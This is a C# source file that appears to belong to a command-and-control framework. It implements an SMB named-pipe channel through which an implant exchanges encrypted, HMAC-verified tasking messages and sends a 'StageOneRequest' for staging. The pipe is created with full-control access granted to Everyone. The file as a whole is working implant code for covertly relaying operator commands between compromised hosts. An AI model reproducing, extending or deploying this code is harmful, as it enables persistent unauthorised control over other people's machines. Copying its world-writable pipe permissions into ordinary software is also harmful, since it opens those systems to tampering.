using System;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

class SmbCommModule : CommModule
{
    readonly string Pipename;
    ManualResetEvent Status = new ManualResetEvent(false);

    public SmbCommModule(string pipename)
    {
        Pipename = pipename;
    }

    public override void Start(CryptoController crypto)
    {
        base.Start(crypto);

        var ps = new PipeSecurity();

        ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null),
            PipeAccessRights.FullControl, AccessControlType.Allow));

        Task.Factory.StartNew(delegate ()
        {
            while (ModuleStatus == ModuleStatus.Running)
            {
                Status.Reset();
                var pipe = new NamedPipeServerStream(Pipename, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.Asynchronous, 1024, 1024, ps);
                pipe.BeginWaitForConnection(new AsyncCallback(ConnectCallback), pipe);
                Status.WaitOne();

                Thread.Sleep(1000);
            }
        });
    }

    private void ConnectCallback(IAsyncResult ar)
    {
        Status.Set();

        var pipe = ar.AsyncState as NamedPipeServerStream;
        pipe.EndWaitForConnection(ar);

        var state = new CommStateObject
        {
            Worker = pipe
        };

        pipe.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
    }

    private void ReadCallback(IAsyncResult ar)
    {
        var state = ar.AsyncState as CommStateObject;
        var pipe = state.Worker as NamedPipeServerStream;

        var bytesRead = 0;

        try
        {
            bytesRead = pipe.EndRead(ar);
        }
        catch { }

        if (bytesRead > 0)
        {
            var data = DataJuggle(bytesRead, pipe, state);

            if (Crypto.VerifyHMAC(data))
            {
                var inbound = Crypto.Decrypt<AgentMessage>(data);

                if (inbound != null)
                {
                    Inbound.Enqueue(inbound);
                }
            }
        }

        var outbound = new AgentMessage { Metadata = Metadata };

        if (Outbound.Count > 0)
        {
            outbound = Outbound.Dequeue();
        }

        var dataToSend = Crypto.Encrypt(outbound);

        pipe.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), pipe);
    }

    private void WriteCallback(IAsyncResult ar)
    {
        var pipe = ar.AsyncState as NamedPipeServerStream;

        pipe.EndWrite(ar);
        pipe.Close();
    }

    public void QueueStageRequest()
    {
        var message = new AgentMessage
        {
            Metadata = Metadata,
            Data = new C2Data
            {
                Module = "Core",
                Command = "StageOneRequest"
            }
        };

        base.SendData(message);
    }

    private byte[] DataJuggle(int bytesRead, NamedPipeServerStream stream, CommStateObject state)
    {
        var final = new byte[] { };

        var dataReceived = state.Buffer.TrimBytes();

        if (bytesRead == state.Buffer.Length)
        {
            if (state.SwapBuffer != null)
            {
                var tmp = state.SwapBuffer;
                state.SwapBuffer = new byte[tmp.Length + dataReceived.Length];
                Buffer.BlockCopy(tmp, 0, state.SwapBuffer, 0, tmp.Length);
                Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, tmp.Length, dataReceived.Length);
            }
            else
            {
                state.SwapBuffer = new byte[dataReceived.Length];
                Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, 0, dataReceived.Length);
            }

            Array.Clear(state.Buffer, 0, state.Buffer.Length);
            stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
        }
        else
        {
            if (state.SwapBuffer != null)
            {
                final = new byte[state.SwapBuffer.Length + dataReceived.Length];
                Buffer.BlockCopy(state.SwapBuffer, 0, final, 0, state.SwapBuffer.Length);
                Buffer.BlockCopy(dataReceived, 0, final, state.SwapBuffer.Length, dataReceived.Length);
            }
            else
            {
                final = new byte[dataReceived.Length];
                Buffer.BlockCopy(dataReceived, 0, final, 0, dataReceived.Length);
            }
        }

        return final.TrimBytes();
    }
}